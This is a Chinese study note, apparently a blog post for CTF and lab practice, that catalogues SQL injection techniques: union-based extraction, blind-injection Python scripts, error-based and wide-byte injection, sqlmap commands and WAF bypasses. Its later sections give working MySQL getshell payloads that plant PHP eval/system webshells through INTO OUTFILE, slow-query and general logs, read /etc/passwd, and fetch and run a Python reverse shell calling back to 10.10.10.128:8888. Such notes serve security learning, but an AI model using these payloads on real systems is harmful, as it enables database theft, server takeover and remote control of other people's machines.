---
title: "SQL 注入分类总结"
date: 2026-08-23
draft: false
description: "面向 CTF、靶场与授权安全测试的 SQL 注入分类、盲注、报错注入和 WAF 绕过学习笔记。"
summary: "从常规注入判断到盲注、报错注入、WAF 绕过与 MySQL 文件写入的系统整理。"
tags:
  - SQL 注入
  - CTF
  - Web 安全
categories:
  - 学习笔记
ShowToc: true
TocOpen: false
---

> 本文用于 CTF、实验靶场和明确授权的安全测试环境。请勿将文中的示例用于未授权目标。

## 常规流程

1. 判断注入点
   * 即判断注入的参数，如id，wllm等等，试探是由GET传参还是POST传参
2. 判断注入类型是整型还是字符型
   * 即判断注入的参数类型是整数还是字符串，以注入点为id为例，一般的sql查询语句为`select A from B where id = ()`
   * 以1举例，这里的()可能是1，也可能是”1“，还可能是'1'，或者是('1')、("1")、(('1'))等，这里就是我们要判断的地方，下面是判断的方法：
     * 使用id=1'--+或id=1'#传参，判断是否为单引号，报错则为双引号或数字
     * 若报错则再使用id=1"--+传参判断，若报错则为数字，不报错则为双引号
3. 判断查询列数
   * 假设为数字1的注入，可通过id=1 order by 1,2,3,...来判断有几列（如order by 1,2,3报错，order by 1,2不报错，则有两列）
4. 判断回显位（显示位）
   * 假设为字符'1'的注入，并假设有4列，可通过`id=-1' union select 1,2,3,4 --+`查看有哪些数字会显示，即可判断出回显位(通过让前面的条件不成立使显示只显示后面，完整后端代码为`select A from B where id = '-1' union select 1,2,3,4--'`)
5. 获取所有数据库名
   * 假设为字符"1"的注入，并传入`id=-1' union select schema_name from information_schema.schema --+`或`id=-1' union select database()--+`（database()为当前的数据库）
6. 获取所有表名（假设当前数据库名为test）
   * `select table_name from information_schema.tables where table_schema='test'`
7. 获取字段名
   * `select column_name from information_schema.columns where table_name='xxx'`
8. 获取数据（flag）
   * select xxx from xxx_table

## 无回显盲注

### 布尔盲注（部分回显函数）

- bool盲注利用页面的有限回显信息来进行注入，可以利用每次注入返回一个bool消息来进行先判断信息，如：`where id=1+(substr(select database(), 1, 1)='r', 1, 0)`可对数据库名的单个字符进行判断

- 但是单个字符地在网页中判断太慢了，可以使用python脚本来进行判断：（使用了二分法）

  ```python
  import requests
  import string
  url = ''

  for i in range(1,50):
      l,r= 32, 127
      while 1 < r:
          mid = (l+r)//2
          # payload = f'2-if(ascii(substr((select user()),{i},1))<={mid}, 1, 0)' #查用户名，如admin@localhost
          # payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<={mid}, 1, 0) #查表名
          # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema where table_name=~),{i},1)) <= {mid}, 1,0)' #查字段名
          # payload = f'2-if(ascii(substr(select group_concat(flag) from flag_table)) <= {mid}, 1, 0)' #查值
          res = requests.get(url,params={
              'id': payload
          })
          if 'id=1' in res.text:
              r = mid
          else:
              l = mid+1
      flag += chr(l)
      print(flag)
  ```


* 脚本编写小技巧：利用and观察页面变化的信息，利用非报错的页面请求体来构造成功的条件，注意在写代码时注释用#或--空格





### 延时盲注

- 与bool盲注类似，但是页面没有任何可利用的信息，可以通过延时的方式来制作一个bool信息：`where id=1+if(substr(select user(), 1, 1), 1, 0)`

- 使用sleep()的脚本如下：

  ```python
  import requests
  import string
  url = ''

  for i in range(1,50):
      l,r= 32, 127
      while 1 < r:
          mid = (l+r)//2
          # payload = f'2-if(ascii(substr((select user()),{i},1))<={mid}, sleep(1), 0)' #查用户名，如admin@localhost
          # payload = f'2-if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<={mid}, sleep(1), 0) #查表名
          # payload = f'2-if(ascii(substr((select group_concat(column_name) from information_schema where table_name=~),{i},1)) <= {mid}, sleep(1),0)' #查字段名
          # payload = f'2-if(ascii(substr(select group_concat(flag) from flag_table)) <= {mid}, sleep(1), 0)' #查值
          res = requests.get(url,params={
              'id': payload
          })
          if res.elapsed.total_seconds() > 1.0:
              r = mid
          else:
              l = mid+1
      flag += chr(l)
      print(flag)
  ```


## 其他特殊注入

### 报错注入

当可获得报错信息时可使用报错注入，有三种方式：

* xml处理函数的路径报错

  * `where id = 1 and updatexml(1,concat(0x7e,(select database())),1)`
  * updatexml(参数1,参数2,参数3)：更新xml文件信息，参数1：修改的XML类型的数据，参数2：XPath表达式，用于指定要修改的节点位置，参数3：指定新的节点值
  * 注意：updatexml可输出的信息内容最多是32个字符，可使用left(参数1，参数2)和right(参数1, 参数2)函数来节选输出，参数2为节选字符数

* 利用随机因子配合group爆错

  * `and select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));`

  * 原理说明：使用group by 字符串时，会维护一个临时表，select查count(\*)时，该临时表包含两列：主键，count(\*)。根据原数据库表中有几行，会把字符串带入到临时表中查询几次，还有个前提为floor(rand(0)*2) 产生的随机数的**前六位** 一定是 “011011”，具体导致报错流程如下：

    ```
    1. 取第一条记录，执行concat(database(),floor(rand(0)*2))（第一次执行），计算结果为'database()+'0''，查询虚拟表，发现'database()+'0''主键值不存在，则会执行插入命令，此时又会再次执行一次concat(database(),floor(rand(0)*2))（第二次执行），计算结果为'database()+'1''，然后插入该值。（即：虽然查询比对的是'database()+'0''，但是真正插入的是执行第二次的结果'database()+'1''，这个过程，concat(database(),floor(rand(0)*2))执行了两次，查询比对时执行了一次，插入时执行了一次）
    2.取第二条记录，执行concat(database(),floor(rand(0)*2))（第三次执行），计算结果为'database()+'1''，查询虚拟表，发现'database()+'1''主键值存在，所以不再执行插入指令，也就不会执行第二次concat(database(),floor(rand(0)*2))，count(*) 直接加1，（即，查询为'database()+'1''，直接加1，这个过程，concat(database(),floor(rand(0)*2))执行了一次）
    3.取第三条记录，执行concat(database(),floor(rand(0)*2))（第四次执行），计算结果为'database()+'0''，查询虚拟表，发现'database()+'0''主键值不存在，则会执行插入命令，此时又会再次执行一次concat(database(),floor(rand(0)*2))（第五次执行），计算结果为'database()+'1''将其作为主键值，但是'database()+'1''这个主键值已经存在于虚拟表中了，由于主键值必需唯一，所以会发生报错。而报错的结果就是 'database()+'1''即 'test1'，从而得出数据库的名称
    ```

  * 前提：原数据库有至少三条记录（即至少三行）

* 除了`updatexml`外还可以使用`extractvalue`进行使用，例如

  ```sql
  extractvalue(null, concat(0x7e, (select user())))
  ```

### 宽字节注入

当mysql使用GBK编码，但是链接的容器并没有声明编码时，可以用此方法绕过过滤函数

如`mysqli_real_escape_string`会将参数内特殊字符（如单引号）前加上转译符，这样便可以防止SQL注入(默认utf-8编码)

但是如果没有声明`gbk`编码时，对于大于`128`的ASCII码并不会认为是特殊字符

* 针对设置全局gbk编码在mysqli_real_escape_string之后的逃逸：
  * `%df%27`在经过mysqli_real_escape_string过滤后变为`%df%5C%27`(%5c为转义符\\，%27为单引号)
  * 但在之后经过gbk编码后将`%df\`看作一个汉字`運`，这样我们的单引号便逃逸了出来
  * 当后续需要使用单引号包裹的数据时，可使用十六进制传入（如将f1ag_table转化为0x663161675f7461626c65）

### 堆叠注入

也叫多行注入，如果发现代码允许多行查询时可使用

当代码过滤了select时，有两种方法绕过select

* 使用show和handler搭配

  * 查表

    ```sql
    show databases;
    show tables;
    show columns from table;
    ```



  * handle的使用（用于读表）

    ```sql
    -- 读取test表
    handler test open;
    handler test read first;
    handler test close;
    ```

* 使用动态执行预处理(如果过滤了show、handle的使用)

  ```sql
  set @a=0xxxxx; # 要执行语句的16进制
  prepare test from @a;
  execute test;
  ```



### SQLmap的使用

* 相关的payload

  ```
  python sqlmap.py -u "https://xxx/?id=1&username=1" --dbs # 查询所有数据库
  python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --tables # 查询test数据库下所有表
  python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --schema # 查询test数据库下所有表结构
  python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列
  python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --dump # 获取f1ag_table表的内容
  python sqlmap.py -u "https://xxx/" --data "id=1" --dbs # 传输POST参数
  python sqlmap.py -u "https://xxx/" --all # 获取所有信息
  ```


### 二次注入

二次注入是指已 存储 （数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。(可以理解为先将注入的数据存入数据库，后续有代码引用存入数据库的恶意数据，再次注入的一个过程)
二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询

基本步骤：

第一步：插入恶意数据
 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。

第二步：引用恶意数据
 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。

### Header注入(请求头注入)

header 头注入本质是 insert 注入，从开发者的角度思考，从 header 中获取信息，一般是为了记录登录信息，登录信息包括客户端登录时的 ip_adress、accept 及客户端类型 user-agent 等

* 常见的请求头

  ```
  User-Agent    浏览器的身份标识
  Referer    标识浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面
  Accept    可接受的响应内容类型(Content-Types)
  X-Forwarded-For    可以用来标识HTTP请求端真实IP
  Date    发送该消息的日期和时间(以RFC 7231中定义的"HTTP日期"格式来发送)
  ```



## 有WAF情况下的SQL注入

* **WAF**，即针对web防火墙，本质上是一些过滤的机制，争对不同的WAF有不同的过滤机制，常见的有**SQL注入过滤**、**XSS过滤**、**文件包含过滤**等等，针对SQL注入过滤的WAF一般会过滤掉一些敏感的关键词，如select、union、information_schema等，或者是一些特殊符号，如单引号、双引号、空格等，甚至是一些常见的payload，如`' or '1'='1`等，所以在有WAF的情况下，我们需要绕过这些过滤机制来进行SQL注入。

并且当SQL题目出现WAF时，一般来说，SQLmap是无法直接解出的，因为SQLmap会被WAF过滤掉，而应对一些WAF需要一些特别的脚本，所以我们需要学会手动进行SQL注入绕过WAF

### SQL注入中的空格绕过

* 注释符替代法

使用/**/或%0a替代空格，可有效绕过过滤机制

* SQLmap自动化工具

使用space2comment.py脚本将空格替换为/**/：
```
python sqlmap.py -u "http://target/?id=1" --tamper "space2comment.py" --dbs
```

## 使用sql语句获取shell

在做sqli-lab的时候刷到一个题解写了个新奇的方式就去查了查资料

### Less -7 利用into Outfile来写shell

源代码：

```sql
$sql``=``"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"``;
``$result``=mysql_query(``$sql``);
``$row` `= mysql_fetch_array(``$result``);
``if``(``$row``){``  ``echo` `'You are in.... Use outfile......'``;``}
``else``{``  ``echo` `'You have an error in your SQL syntax'``; ``}
```

 $id被双层括号和单引号包围，URL正确时有提示 用outfile，错误时只知有错误

```
http:``//www.sqli-lab.cn/Less-7/?id=1')) union select  null,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e,null  into outfile '\\var\\WWW\\sqli\\Less-7\\1.php' --+
```

写之前需要知道物理路径，且得是有写入权限的才行。

![img](/images/sql-injection/1937295-20200223214049874-1413040021.png)

### mysql的--os-shell

#### 利用原理

--os-shell就是使用udf提权获取WebShell。也是通过into oufile向服务器写入两个文件，一个可以直接执行系统命令，一个进行上传文件。此为sqlmap的一个命令，利用这条命令的先决条件：

- 要求为数据库DBA，使用`--is-dba`查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba
- secure_file_priv没有具体值
- 知道网站的绝对路径

#### 漏洞复现

##### --os-shell

```sql
python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --os-shell


which web application language does the web server support?
[1] ASP (default)
[2] ASPX
[3] JSP
[4] PHP
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
[09:43:59] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 2
please provide a comma separate list of absolute directory paths: F:\phpstudy_pro\WWW
[09:44:36] [WARNING] unable to automatically parse any web server path
[09:44:36] [INFO] trying to upload the file stager on 'F:/phpstudy_pro/WWW/' via LIMIT 'LINES TERMINATED BY' method
[09:44:36] [INFO] the file stager has been successfully uploaded on 'F:/phpstudy_pro/WWW/' - http://127.0.0.1:80/tmpucfjt.php
[09:44:36] [INFO] the backdoor has been successfully uploaded on 'F:/phpstudy_pro/WWW/' - http://127.0.0.1:80/tmpbayce.php
sqlmap在指定的目录生成了两个文件（文件名是随机的，并不是固定的）：
-   tmpbayce.php 用来执行系统命令
-   tmpucfjt.php 用来上传文件
[09:44:36] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a]

command standard output: 'ms-vnwaexpuvbab\administrator'
```

![image-20240828105419312](/images/sql-injection/3262985-20240912191557248-1531854198.png)

![image-20240828105703346](/images/sql-injection/3262985-20240912191553468-1087525608.png)

![image-20240828105749616](/images/sql-injection/3262985-20240912191553751-618730422.png)

##### --sql-shell

我们可以先使用这个来执行一些sql语句

```sql
python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --sql-shell
```

1、查看文件路径

```sql
select @@datadir;
```

2、查看secure_file_priv的值是否为空

```sql
select @@secure_file_priv;
```

返回结果如果有null，则无法写入。当为空的时候则什么都不返回

![image-20240828110244292](/images/sql-injection/3262985-20240912191554031-597097448.png)

> secure_file_prive：MySQL的secure-file-prive参数是用来限制LOAD DATA, SELECT ,OUTFILE, and LOAD_FILE()传到哪个指定目录的。
>
> secure_file_prive= ，结果为空的话，表示允许任何文件读写
>
> secure_file_prive=NULL，表示不允许任何文件读写
>
> secure_file_prive=‘某个路径’，表示这个路径作为文件读写的路径
>
> 在mysql5.5版本前，都是默认为空，允许读取
>
> 在mysql5.6版本后，默认为NULL，并且无法用SQL语句对其进行修改。所以这种只能在配置进行修改

### 二、慢日志getshell

慢日志：一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值(默认为10秒)，这个查询语句将被记录到慢查询日志中。

#### 查看服务器默认时间值

```sql
show global variables like '%long_query_time%'
show global variables like '%long%'
```

![image-20240828112933020](/images/sql-injection/3262985-20240912191554268-251907985.png)

![image-20240828113006715](/images/sql-injection/3262985-20240912191554584-1652251386.png)

#### 查看慢日志参数

```sql
show global variables like '%slow%'
```

![image-20240828113058413](/images/sql-injection/3262985-20240912191554860-1043588222.png)

#### 慢日志参数修改getshell

```sql
set global slow_query_log=1         # 打开慢日志
set global slow_query_log_file='C:\\phpStudy\\WWW\\test.php'    # 慢日志的路径【注意：一定要用双反斜杠】
SELECT '<?php @eval($_POST[1]);?>' or sleep(11)        # 这儿11是超过慢日志的10秒时间


# 测试
http://192.168.111.128/test.php
```

![image-20240828135717651](/images/sql-injection/3262985-20240912191555702-864658278.png)

![image-20240828135751682](/images/sql-injection/3262985-20240912191555953-1587063896.png)

### 三、general_log来getshell

#### 介绍说明

```sql
相关参数一共有3个：general_log、log_output、general_log_file


show variables like 'general_log';   # 查看日志是否开启
set global general_log=on;   # 开启日志功能


show variables like 'general_log_file';    # 看看日志文件保存位置
set global general_log_file='C:/phpStudy/WWW/shell.php';   # 设置日志文件保存位置


show variables like 'log_output';  -- 看看日志输出类型  table或file
set global log_output='table'; -- 设置输出类型为 table
set global log_output='file';   -- 设置输出类型为file
一般log_output都是file,就是将日志存入文件中。table的话就是将日志存入数据库的日志表中。
```

#### 漏洞复现

```sql
set global general_log='on';
set global general_log_file='C:/phpStudy/WWW/shell.php'
select '<?php @eval($_POST['pwd']);?>';

# 测试
http://192.168.111.128/shell.php
```

![image-20240828120108687](/images/sql-injection/3262985-20240912191555100-300995878.png)

![image-20240828120147355](/images/sql-injection/3262985-20240912191555407-965559790.png)

### 四、into_outfile方法getshell

#### 漏洞复现

```sql
email=admin'                #（报错）
email=admin' #              #（不报错）
email=admin' or '1' #        # 成功登入

email=admin' union select 1,2,3,4,5,6,7,8 #
email=admin' union select 1,2,3,4,5,6,7,8,9 #
email=admin' union select 1,2,3,database(),5,6,7,8 #
email=admin' union select 1,2,3,user(),5,6,7,8 #
email=admin' union select 1,2,3,@@version,5,6,7,8 #
email=admin' union select 1,2,3,group_concat(schema_name),5,6,7,8 from information_schema.schemata#
email=admin' union select 1,2,3,group_concat(table_name),5,6,7,8 from information_schema.tables where table_schema=database()#
email=admin' union select 1,2,3,group_concat(column_name),5,6,7,8 from information_schema.columns where table_schema=database() and table_name='users'#
email=admin' union select 1,2,3,group_concat(concat_ws(':',first_name,last_name,pass,email,pass)),5,6,7,8 from ch16.users#
admin@isints.com : killerbeesareflying


email=admin' union select 1,2,3,load_file('/etc/passwd'),5,6,7,8 #
email=admin' union select 1,2,3,"<?php system($_POST['x']);?>",5,6,7,8 into outfile '/var/www/sqli_shell.php'#
email=admin' union select 1,2,3,load_file('/var/www/sqli_shell.php'),5,6,7,8 #

```

![image-20240828155950037](/images/sql-injection/3262985-20240912191556656-1305182432.png)

![image-20240828160043328](/images/sql-injection/3262985-20240912191556947-1128973548.png)

#### 缺点

```scss
1、对web目录需要有写权限能够使用单引号(root)
2、知道网站绝对路径(phpinfo/php探针/通过报错等)
3、secure_file_priv为空
```

查看secure_file_priv参数，该参数是只读参数，不能使用set global命令修改，如果修改大概率会报错。

```
show global variables like '%secure%';
```

### 五、远程加载拿shell

```sql
# 准备脚本
//shell8888.py
export RHOST="10.10.10.128";export RPORT=8888;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
//get8888.php
<?php system('cd /tmp;wget http://10.10.10.128:81/shell8888.py;chmod +x shell8888.py;./shell8888.py')?>

# sqlmap上传get8888.php
//上传shell
sqlmap -u 'http://10.10.10.100/login.php' --data='email=admin&pass=admin&submit=Login' --file-write='get8888.php' --file-dest='/var/www/get8888.php'

# 本地开启监听
nc -lvvp 8888

# 本地开启web下载服务
php -S 0:81

# 浏览器远程访问加载get8888.php
http://10.10.10.100/shell8888.py
```

![image-20240828153707662](/images/sql-injection/3262985-20240912191556319-341942034.png)

### 六、数据库备份getshell

网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等。

而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传的文件格式，如jpg、gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。

### 获取网站根目录方式

(1)phpinfo()页面：最理想的情况，直接显示web路径

(2)web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径（单引号、参数报错）

(3)一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以猜测默认路径或者通过查看数据库保存的路径、配置文件路径等。

(4)搜索引擎、利用其他漏洞、中间件错误解析等

资料取自[mysql_getshell的几种方法 - gcc_com - 博客园](https://www.cnblogs.com/carmi/p/18410869)
